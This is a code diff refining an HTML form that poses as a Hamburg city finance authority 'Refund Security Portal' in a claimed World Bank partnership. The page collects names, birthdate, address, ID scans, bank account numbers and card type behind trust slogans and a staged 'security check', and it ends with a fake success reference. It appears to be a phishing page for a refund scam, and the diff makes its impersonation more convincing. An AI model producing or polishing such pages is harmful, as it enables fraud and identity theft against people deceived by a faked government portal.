@@ -9,14 +9,14 @@
         body { font-family: 'Segoe UI', Arial, sans-serif; margin: 0; padding: 20px; min-height: 100vh; display: flex; flex-direction: column; align-items: center; 
             background: linear-gradient(rgba(0, 48, 99, 0.7), rgba(0, 48, 99, 0.7)), url('https://wikimedia.org');
             background-size: cover; background-position: center; background-attachment: fixed; color: #333; }
-        .form-container { background: rgba(255, 255, 255, 0.98); width: 100%; max-width: 800px; border-radius: 4px; box-shadow: 0 40px 100px rgba(0,0,0,0.6); overflow: hidden; border-top: 12px solid var(--hamburg-red); margin-top: 20px; }
-        .security-banner { background: var(--hamburg-blue); color: white; padding: 10px; text-align: center; font-size: 11px; font-weight: bold; text-transform: uppercase; border-bottom: 2px solid var(--security-gold); }
+        .form-container { background: white; width: 100%; max-width: 800px; border-radius: 4px; box-shadow: 0 40px 100px rgba(0,0,0,0.6); overflow: hidden; border-top: 12px solid var(--hamburg-red); margin-top: 20px; }
+        .security-banner { background: var(--hamburg-blue); color: white; padding: 12px; text-align: center; font-size: 11px; font-weight: bold; text-transform: uppercase; border-bottom: 2px solid var(--security-gold); }
         .header { padding: 40px 30px; text-align: center; background: white; border-bottom: 5px solid var(--hamburg-blue); }
         .header h1 { color: var(--hamburg-blue); margin: 0; font-size: 26px; font-weight: 900; text-transform: uppercase; }
         .header p { margin: 10px 0 0; color: var(--hamburg-red); font-weight: 700; font-size: 11px; text-transform: uppercase; letter-spacing: 2px; }
         .section-box { padding: 40px; display: none; }
         .section-box.active { display: block; }
-        .theme-callout { background: #f8f9fa; border-left: 5px solid var(--hamburg-blue); padding: 15px; margin-bottom: 30px; font-size: 13px; font-style: italic; color: #555; }
+        .theme-callout { background: #f8f9fa; border-left: 5px solid var(--hamburg-blue); padding: 15px; margin-bottom: 30px; font-size: 13px; font-style: italic; color: #555; line-height: 1.5; }
         h2 { font-size: 17px; color: var(--hamburg-blue); margin-bottom: 25px; font-weight: 800; text-transform: uppercase; border-bottom: 1px solid #eee; padding-bottom: 10px; }
         .input-group { margin-bottom: 20px; }
         .grid-3 { display: grid; grid-template-columns: 1fr 1fr 1fr; gap: 15px; }
@@ -37,35 +37,97 @@
     <div class="form-container">
         <div class="security-banner">🛡️ Secure Returns, Scam-Free Service • Verified for Your Safety</div>
         <form id="refundForm">
-            <div class="header"><h1>FREIE UND HANSESTADT HAMBURG</h1><p>World Bank Partnership • Refund Security Portal</p></div>
+            <div class="header">
+                <h1>FREIE UND HANSESTADT HAMBURG</h1>
+                <p>World Bank Partnership • Refund Security Portal</p>
+            </div>
 
+            <!-- SECTION 1 -->
             <div id="section1" class="section-box active">
                 <div class="theme-callout">"Our mission is to protect every transaction with rigorous verification and proactive scam prevention."</div>
                 <h2>Section 1: Identity & Nationality</h2>
-                <div class="input-group"><div class="grid-3"><div><label>Last Name *</label><input type="text" class="required"></div><div><label>First Name *</label><input type="text" class="required"></div><div><label>Middle Name *</label><input type="text" class="required"></div></div></div>
-                <div class="grid-2"><div class="input-group"><label>Personal Email *</label><input type="email" class="required"></div><div class="input-group"><label>Nationality *</label><input type="text" class="required"></div></div>
-                <div class="input-group"><label>Address *</label><input type="text" class="required"></div>
-                <div class="grid-2"><div><label>Birthdate *</label><input type="date" class="required"></div><div><label>Contact *</label><input type="text" class="required"></div></div>
-                <div class="input-group"><label>ID Upload *</label><input type="file" class="required"></div>
-                <div class="btn-container"><span></span><button type="button" onclick="nextS()">Next</button></div>
+                <div class="input-group">
+                    <div class="grid-3">
+                        <div><label>Last Name *</label><input type="text" class="required"></div>
+                        <div><label>First Name *</label><input type="text" class="required"></div>
+                        <div><label>Middle Name *</label><input type="text" class="required"></div>
+                    </div>
+                </div>
+                <div class="grid-2">
+                    <div class="input-group"><label>Personal Email *</label><input type="email" class="required"></div>
+                    <div class="input-group"><label>Nationality *</label><input type="text" class="required"></div>
+                </div>
+                <div class="input-group"><label>Residential Address *</label><input type="text" class="required"></div>
+                <div class="grid-2">
+                    <div><label>Birthdate *</label><input type="date" class="required"></div>
+                    <div><label>Contact Number *</label><input type="text" class="required"></div>
+                </div>
+                <div class="input-group"><label>Upload Valid ID *</label><input type="file" class="required"></div>
+                <div class="btn-container"><span></span><button type="button" onclick="nextStep()">Continue to Step 2</button></div>
             </div>
 
+            <!-- SECTION 2 -->
             <div id="section2" class="section-box">
                 <div class="theme-callout">"Verified for Your Safety - Implementing multi-layer verification."</div>
                 <h2>Section 2: Security & Disbursement</h2>
-                <div class="grid-2"><div><label>Amount (EUR) *</label><input type="number" class="required"></div><div><label>Receipt *</label><input type="file" class="required"></div></div>
+                <div class="grid-2">
+                    <div><label>Refund Amount (EUR) *</label><input type="number" class="required"></div>
+                    <div><label>Proof of Claim *</label><input type="file" class="required"></div>
+                </div>
                 <div class="input-group"><label>Bank Name *</label><input type="text" class="required"></div>
-                <div class="grid-2"><div><label>Account Number *</label><input type="text" class="required"></div><div><label>Card Type *</label><select class="required"><option value="">Select...</option><option>Debit</option><option>Credit</option></select></div></div>
-                <div id="loader-container"><div id="loader"></div><p style="font-size: 11px; color: var(--hamburg-blue);">PERFORMING SECURITY CHECK...</p></div>
-                <div class="btn-container"><button type="button" onclick="prevS()" style="background:#666">Back</button><button type="button" id="subB" onclick="subM()">Submit Claim</button></div>
+                <div class="grid-2">
+                    <div><label>Account Number *</label><input type="text" class="required"></div>
+                    <div><label>Card Type *</label><select class="required"><option value="">Select...</option><option>Debit</option><option>Credit</option></select></div>
+                </div>
+                <div id="loader-container"><div id="loader"></div><p style="font-size: 11px; color: var(--hamburg-blue); font-weight: bold;">PERFORMING SECURITY CHECK...</p></div>
+                <div class="btn-container">
+                    <button type="button" onclick="prevStep()" style="background:#666">Back</button>
+                    <button type="button" id="subBtn" onclick="submitClaim()">Submit Claim</button>
+                </div>
             </div>
         </form>
-        <div class="footer">© 2024 Behörde para sa Pananalapi • Hamburg | <strong>"Protecting Your Peace of Mind."</strong></div>
+        <div class="footer">
+            © 2024 Behörde für Finanzen • Hamburg | World Bank Audit Partner <br>
+            <strong>"Protecting Your Peace of Mind."</strong>
+        </div>
     </div>
+
     <script>
-        function nextS() { let i = document.querySelectorAll('#section1 .required'); let v = true; i.forEach(el => { if(!el.value) { el.classList.add('error'); v = false; } else el.classList.remove('error'); }); if(v) { document.getElementById('section1').classList.remove('active'); document.getElementById('section2').classList.add('active'); } }
-        function prevS() { document.getElementById('section2').classList.remove('active'); document.getElementById('section1').classList.add('active'); }
-        function subM() { let i = document.querySelectorAll('#section2 .required'); let v = true; i.forEach(el => { if(!el.value) { el.classList.add('error'); v = false; } else el.classList.remove('error'); }); if(v) { document.getElementById('subB').style.display = 'none'; document.getElementById('loader-container').style.display = 'block'; setTimeout(() => { alert('SUCCESS!\nRef: WB-SEC-' + Math.floor(Math.random()*999999)); location.reload(); }, 3500); } }
+        function nextStep() {
+            let inputs = document.querySelectorAll('#section1 .required');
+            let valid = true;
+            inputs.forEach(i => {
+                if(!i.value) { i.classList.add('error'); valid = false; }
+                else i.classList.remove('error');
+            });
+            if(valid) {
+                document.getElementById('section1').classList.remove('active');
+                document.getElementById('section2').classList.add('active');
+                window.scrollTo(0,0);
+            }
+        }
+        function prevStep() {
+            document.getElementById('section2').classList.remove('active');
+            document.getElementById('section1').classList.add('active');
+            window.scrollTo(0,0);
+        }
+        function submitClaim() {
+            let inputs = document.querySelectorAll('#section2 .required');
+            let valid = true;
+            inputs.forEach(i => {
+                if(!i.value) { i.classList.add('error'); valid = false; }
+                else i.classList.remove('error');
+            });
+            if(valid) {
+                document.getElementById('subBtn').style.display = 'none';
+                document.getElementById('loader-container').style.display = 'block';
+                setTimeout(() => {
+                    const ref = 'WB-SEC-' + Math.floor(100000 + Math.random() * 900000);
+                    alert('VERIFICATION SUCCESSFUL!\nReference: ' + ref + '\nClaim transmitted to Audit Unit.');
+                    location.reload();
+                }, 3500);
+            }
+        }
     </script>
 </body>
 </html>
